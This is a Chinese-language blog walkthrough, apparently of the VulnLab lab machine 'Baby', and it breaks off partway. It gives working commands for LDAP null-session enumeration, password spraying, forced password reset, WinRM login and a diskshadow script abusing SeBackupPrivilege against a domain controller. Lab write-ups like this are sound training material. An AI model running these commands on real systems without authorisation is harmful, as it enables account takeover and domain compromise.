@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;2686f74a-eb4f-4b71-87d7-08f2456b0189 在這次滲透測試中，首先使用了 nmap 掃描工具來識別目標系統的開放端口，發現這是一台名為 BABYDC 的 Active Directory 服務器，開放了 LDAP 端口。接著，使用 ldapsearch 工具嘗試匿名登錄，成功獲取了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnLab - Machine - Baby">
+<meta property="og:url" content="https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;2686f74a-eb4f-4b71-87d7-08f2456b0189 在這次滲透測試中，首先使用了 nmap 掃描工具來識別目標系統的開放端口，發現這是一台名為 BABYDC 的 Active Directory 服務器，開放了 LDAP 端口。接著，使用 ldapsearch 工具嘗試匿名登錄，成功獲取了">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241228050738-grjmhv4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227214827-n7bdk1x.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227214846-0r3d0h8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227214933-hkn9p47.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227215149-tdb5civ.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227215302-cagwyj1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227215642-3kwkj17.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227215818-sk4dxvp.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227221036-9kh76fo.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227221205-in2vom2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227221317-gbo2qbs.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227221338-3vu2j2e.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227221404-60o46um.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227221644-vxz0d3n.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227221752-p5y0zlb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227222112-552orwt.png">
+<meta property="article:published_time" content="2024-12-27T22:31:00.000Z">
+<meta property="article:modified_time" content="2024-12-27T22:32:17.627Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241228050738-grjmhv4.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnLab - Machine - Baby</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/28/2024-htb-machine/59-UnderPass/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&text=VulnLab - Machine - Baby"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&title=VulnLab - Machine - Baby"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&is_video=false&description=VulnLab - Machine - Baby"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Baby&body=Check out this article: https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&title=VulnLab - Machine - Baby"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&title=VulnLab - Machine - Baby"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&title=VulnLab - Machine - Baby"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&title=VulnLab - Machine - Baby"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&name=VulnLab - Machine - Baby&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&t=VulnLab - Machine - Baby"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VulnLab - Machine - Baby
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-27T22:31:00.000Z" class="dt-published" itemprop="datePublished">2024-12-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241228050738-grjmhv4.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=2686f74a-eb4f-4b71-87d7-08f2456b0189">https://api.vulnlab.com/api/v1/share?id=2686f74a-eb4f-4b71-87d7-08f2456b0189</a></p>
+<p>在這次滲透測試中，首先使用了 nmap 掃描工具來識別目標系統的開放端口，發現這是一台名為 BABYDC 的 Active Directory 服務器，開放了 LDAP 端口。接著，使用 ldapsearch 工具嘗試匿名登錄，成功獲取了 LDAP 裡面的內容，這通常是無法匿名訪問的。通過提取 LDAP 中的用戶信息，找到了用戶 Teresa.Bell 的可能密碼 BabyStart123!，但無法直接使用該密碼登錄。隨後嘗試進行密碼噴射攻擊，發現一個用戶狀態為 STATUS_PASSWORD_MUST_CHANGE，這意味著該用戶必須更改密碼才能使用。利用 impacket-smbpasswd 工具成功更改了該用戶的密碼，並在幾分鐘後確認修改生效。接著，使用 netexec winrm 工具檢查該用戶是否有權限通過 WinRM 登錄，確認後發現該用戶擁有 SeBackupPrivilege 和 SeRestorePrivilege 權限，這意味著可以濫用這些權限來開啟虛擬硬盤。接著，下載並上傳了兩個 DLL 文件到目標機器，成功獲得三個文件，通過 secretsdump.py 工具提取到了管理員的 hash。最後，使用 evil-winrm 工具成功以管理員身份登錄。</p>
+<h1 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h1><p>首先使用 nmap 掃描一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -sS -p- -sC -sV -vv -oA save --min-rate=1000 10.10.117.140</span><br><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-12-27 13:42:27Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=BabyDC.baby.vl</span><br><span class="line">| Issuer: commonName=BabyDC.baby.vl</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-12-26T13:39:54</span><br><span class="line">| Not valid after:  2025-06-27T13:39:54</span><br><span class="line">| MD5:   12a5:7c9f:c811:9300:0b09:5e76:8cda:565d</span><br><span class="line">| SHA-1: 5ab9:23f4:ef3d:9c9b:0759:afff:2200:cb1c:55ec:69b4</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIC4DCCAcigAwIBAgIQeLJDWWuf05JGIagDwhVtNDANBgkqhkiG9w0BAQsFADAZ</span><br><span class="line">| MRcwFQYDVQQDEw5CYWJ5REMuYmFieS52bDAeFw0yNDEyMjYxMzM5NTRaFw0yNTA2</span><br><span class="line">| MjcxMzM5NTRaMBkxFzAVBgNVBAMTDkJhYnlEQy5iYWJ5LnZsMIIBIjANBgkqhkiG</span><br><span class="line">| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1AwH4EuuD6Szo+5fOk5k32tqjnwBiaoxS9uN</span><br><span class="line">| CZxFiKUvI++9MV1DJSzAKDVwND3Y8VHEMIq7oqSjopWX8qnEcTd7sQQyDNk+XG/v</span><br><span class="line">| 6OXoMoFscoPze60V9c0pTudURakiQXyDnKnMtM6qJllIq+RYc+wqpuSOkGbFiMHt</span><br><span class="line">| OATz1+D5u+qX926311NwpCl6m/12ybh9Y/7SrRgygXdzu46407AfnvBAQesugnHL</span><br><span class="line">| KofBNf8MrqW5AgOAH46io51b6x8qCK+p6KNa2GhphNL1EG/obxTu5b4O1LjpmBr3</span><br><span class="line">| kW9oNL+PoSkdfp4wC4+VddWxYgITBWRNKyI2S13/LIpTY6JxiQIDAQABoyQwIjAT</span><br><span class="line">| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD</span><br><span class="line">| ggEBADboOC9mYhc8c6lOqHk64EAYUaJGboNZVDI0rMNhTeMQX0RdPYcFgKt3wQyv</span><br><span class="line">| PL4LrAaFnWXgBB2JPCAYYwmdj1zy+gzVqOa18qZpWqafTkn7Z8NAIS8asT8oLiGg</span><br><span class="line">| LHpuqA0i2sINAzEAd5OcL1VPXzE7/SWYV/haFxAmmyutRvcy8hR5MlIXmLWvvLKX</span><br><span class="line">| iZe7dxwcziNwT78VMPllCRoiJGTqdr/du51Q1x+YcngJsyp74ms3yBqSrKDpskBT</span><br><span class="line">| sqS+GB6Y3UiEY5g60Hip078+oFbzJNJZOEifhPSIzXEIQNfwuiFiNSuIs8yjNQLN</span><br><span class="line">| xgJU2SaIjfcVk+bsYphBx68qeaY=</span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: BABY</span><br><span class="line">|   NetBIOS_Domain_Name: BABY</span><br><span class="line">|   NetBIOS_Computer_Name: BABYDC</span><br><span class="line">|   DNS_Domain_Name: baby.vl</span><br><span class="line">|   DNS_Computer_Name: BabyDC.baby.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2024-12-27T13:43:19+00:00</span><br><span class="line">|_ssl-date: 2024-12-27T13:43:58+00:00; -4s from scanner time.</span><br><span class="line">49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">51346/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| p2p-conficker:</span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 27547/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 8132/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 28199/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 54735/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-12-27T13:43:19</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: -4s, deviation: 0s, median: -4s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到這個是一臺 AD，名字叫 <code>BABYDC</code>​。</p>
+<h1 id="Login-ldap-with-null-session"><a href="#Login-ldap-with-null-session" class="headerlink" title="Login ldap with null session"></a>Login ldap with null session</h1><p>看到開啓了 ldap 端口，嘗試使用 <code>ldapsearch</code>​ 來匿名登錄看看：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> ldapsearch <span class="literal">-H</span> ldap://<span class="number">10.10</span>.<span class="number">117.140</span> <span class="literal">-x</span> <span class="literal">-s</span> base namingcontexts</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227214827-n7bdk1x.png" alt="image">​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -H ldap://10.10.117.140 -x -b &quot;DC=baby,DC=vl&quot;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227214846-0r3d0h8.png" alt="image">​</p>
+<p>結果成功的獲取了 ldap裏面的内容，一般 <code>DC=baby,DC=vl</code>​ 是沒有權限獲取的。</p>
+<p>既然成功的獲取到了裏面的内容，那麽用戶名就可以抓取到，而且 <code>description</code>​ 經常被用來藏一些有價值的東西，所以使用 <code>grep</code>​ 把他全部抓出來</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -H ldap://10.10.117.140 -x -b &quot;DC=baby,DC=vl&quot; | grep -E &quot;(sAMAccountName|description)&quot; </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227214933-hkn9p47.png" alt="image">​</p>
+<p>得到了個類似密碼的東西是 <code>BabyStart123!</code>​ ，這個用戶是 <code>Teresa.Bell</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227215149-tdb5civ.png" alt="image">​</p>
+<p>不過很可惜，沒有辦法登錄：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.10.117.140 -u Teresa.Bell -p &#x27;BabyStart123!&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227215302-cagwyj1.png" alt="image">​</p>
+<h1 id="Password-spraying"><a href="#Password-spraying" class="headerlink" title="Password spraying"></a>Password spraying</h1><p>既然沒辦法登錄，那就嘗試密碼噴射看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.10.117.140 -u user.txt -p &#x27;BabyStart123!&#x27;  --continue-on-success</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227215642-3kwkj17.png" alt="image">​</p>
+<p>結果看到有一個用戶顯示 <code>STATUS_PASSWORD_MUST_CHANGE</code>​，這意思是必須要修改該用戶的密碼才可以使用該用戶，那就使用 <code>impacket-smbpasswd</code>​ 來嘗試修改密碼：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-smbpasswd -debug -newpass &#x27;P@ssw0rd123!&#x27; &#x27;Caroline.Robinson:BabyStart123!&#x27;@10.10.117.140 </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227215818-sk4dxvp.png" alt="image">​</p>
+<p>成功了之後需要等待幾分鐘才會應用，可以用 netexec 看一下修改密碼成功沒有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.10.117.140 -u Caroline.Robinson -p &#x27;P@ssw0rd123!&#x27; </span><br><span class="line">$ netexec winrm 10.10.117.140 -u Caroline.Robinson -p &#x27;P@ssw0rd123!&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227221036-9kh76fo.png" alt="image">​</p>
+<p>當顯示有效用戶了之後，使用 <code>netexec winrm</code>​ 來快速探測下他有沒有權限登錄 winrm，結果有，所以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 10.10.117.140 -u Caroline.Robinson -p &#x27;P@ssw0rd123!&#x27;</span><br><span class="line">&gt; whoami /priv</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227221205-in2vom2.png" alt="image">​</p>
+<p>一上來我會直接看權限，看到有 <code>SeBackupPrivilege</code>​ 和 <code>SeRestorePrivilege</code>​ 就説明游戲結束。</p>
+<p>‍</p>
+<h1 id="Exploit-with-SeBackupPrivilege"><a href="#Exploit-with-SeBackupPrivilege" class="headerlink" title="Exploit with SeBackupPrivilege"></a>Exploit with SeBackupPrivilege</h1><p>所以濫用 <code>SeBackupPrivilege</code>​，開啓一個虛擬的硬盤：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir C:\mane</span><br><span class="line"><span class="built_in">cd</span> C:\mane</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;set context persistent nowriters&quot;</span> | <span class="built_in">out-file</span> ./diskshadow.txt <span class="literal">-encoding</span> ascii</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;add volume c: alias temp&quot;</span> | <span class="built_in">out-file</span> ./diskshadow.txt <span class="literal">-encoding</span> ascii <span class="literal">-append</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;create&quot;</span> | <span class="built_in">out-file</span> ./diskshadow.txt <span class="literal">-encoding</span> ascii <span class="literal">-append</span>  </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;expose %temp% z:&quot;</span> | <span class="built_in">out-file</span> ./diskshadow.txt <span class="literal">-encoding</span> ascii <span class="literal">-append</span></span><br><span class="line"></span><br><span class="line">diskshadow.exe /s c:\mane\diskshadow.txt</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227221317-gbo2qbs.png" alt="image">​</p>
+<p>然後在<a target="_blank" rel="noopener" href="https://github.com/k4sth4/SeBackupPrivilege">這裏</a>下載兩個 DLL文件，并且上傳到對面機器：</p>
